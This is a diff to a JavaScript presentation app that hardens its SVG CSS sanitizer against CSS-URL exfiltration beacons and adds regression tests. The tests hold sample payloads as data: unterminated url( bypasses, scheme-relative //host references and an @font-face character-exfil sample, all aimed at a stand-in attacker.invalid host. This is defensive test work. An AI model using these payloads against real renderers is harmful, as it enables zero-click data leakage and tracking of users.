@@ -135,8 +135,9 @@ const velaClipboardReadSlides = async () => {
   return [];
 };
 
-const VELA_VERSION = "13.17";
+const VELA_VERSION = "13.18";
 const VELA_CHANGELOG = [
+  { v: "13.18", d: ["Security (High): hardened the SVG <style>/presentation-attribute CSS filter against a CSS-URL exfil-beacon bypass — external and scheme-relative references are now rejected on token presence rather than on a well-formed match, and at-rules (@import/@font-face) are refused. Closes a zero-click render-time fetch on the host runtimes where the deck sanitizers are the sole backstop.", "Added malformed-input regression tests exercised against the real browser sink."] },
   { v: "13.17", d: "Ctrl/⌘-click a section's collapse arrow in the list to collapse or expand every section at once — plain click still toggles just that one section." },
   { v: "13.16", d: "Fixed a race where opening/reloading a deck appended a spurious empty \u201CNew section\u201D each time — the empty-deck seed no longer fires against a deck that is still loading." },
   { v: "13.15", d: "Move a slide/selection to another section with Ctrl/⌘-click on the destination to move it \u201Cout\u201D while keeping focus in the current section on the next slide (or the first slide of the following section when you move the last one) — plain click still follows the slide into its new section." },
@@ -572,9 +573,24 @@ function isSvgStyleSafe(css) {
   // paint CSS never needs comments; reject outright, mirroring the backslash reject
   // above. (Pairs with the same reject in STYLE_VALUE_REJECT.)
   if (css.indexOf("/*") !== -1) return false;
-  if (/@import|expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
-  const urls = css.match(/url\s*\([^)]*\)/gi);
-  if (urls && urls.some((u) => !/^url\s*\(\s*['"]?\s*#/i.test(u))) return false;
+  if (/expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
+  // Reject any at-rule outright: @import pulls an external sheet and @font-face
+  // (with unicode-range) is a per-character font-exfil beacon. Legit Vela paint
+  // CSS never needs one. (Supersedes the prior @import-only reject.)
+  if (css.indexOf("@") !== -1) return false;
+  // Reject any absolute or scheme-relative URL authority. Mirrors STYLE_VALUE_REJECT's
+  // `://` guard (which this filter previously lacked) and also catches scheme-relative
+  // `//host`. Legit paint CSS (colors, url(#frag), sizes) never contains `//`.
+  if (css.indexOf("//") !== -1) return false;
+  // Every url() must be a same-document #fragment paint reference (url(#grad)).
+  // Match the OPENING url( token and require its first meaningful char (past an
+  // optional quote and whitespace) to be '#'. Crucially this does NOT depend on a
+  // closing ')': per CSS Syntax L3 §4.3.6 the tokenizer consumes an unterminated
+  // `url(https://host` to end-of-input and still emits a valid, fetchable
+  // <url-token>, so the prior paren-balanced /url\(...\)/ match missed BOTH the
+  // bare and the quoted unterminated forms. An empty url()/url( ) fetches nothing
+  // and stays allowed.
+  if (/url\s*\(['"\s]*[^#'"\s]/i.test(css)) return false;
   // v12.59: reject any non-url() CSS function fed a string literal. image-set()/
   // image()/cross-fade()/src() (and any future image-ish function) take a bare
   // "https://…" string with NO url() token, so the url() check above misses them
@@ -10145,6 +10161,33 @@ uiSuite("SVG Sanitizer (XSS)", [
   { name: "SVG fill='url(https://…)' presentation attr removed", fn: async () => {
     const out = sanitizeSvgMarkup('<rect fill="url(https://attacker.invalid/b)" filter="url(https://attacker.invalid/f)"/>');
     return !/attacker\.invalid/i.test(out);
+  }},
+  // v13.18 — detection must not depend on a closing ')': the CSS tokenizer consumes
+  // an UNTERMINATED url( to end-of-input and still emits a fetchable url-token, so a
+  // paren-balanced regex missed both the bare and quoted unterminated forms.
+  { name: "SVG <style> unterminated url( (bare) removed (EOF url-token)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>rect{fill:url(https://attacker.invalid/b?d=x</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> unterminated url( (quoted) removed (EOF url-token)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>rect{fill:url("https://attacker.invalid/b?d=x</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG style='…url(https://…' unterminated attr removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<rect style="background-image:url(https://attacker.invalid/b" mask="url(https://attacker.invalid/m"/>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG scheme-relative url(//host) removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>*{background:url(//attacker.invalid/b)}</style><rect fill="url(//attacker.invalid/p)"/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> @font-face char-exfil removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>@font-face{font-family:x;src:url(https://attacker.invalid/f)}text{font-family:x}</style><text x="1" y="9">A</text>');
+    return !/attacker\.invalid/i.test(out) && !/@font-face/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG url(#fragment) with whitespace/quotes still preserved (no false reject)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>.a{fill:url( #grad )}.b{mask:url("#m")}</style><rect class="a" clip-path="url(#c)"/>');
+    return /<style/i.test(out) && /#grad/.test(out) && /url\(#c\)/.test(out);
   }},
   { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
     const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
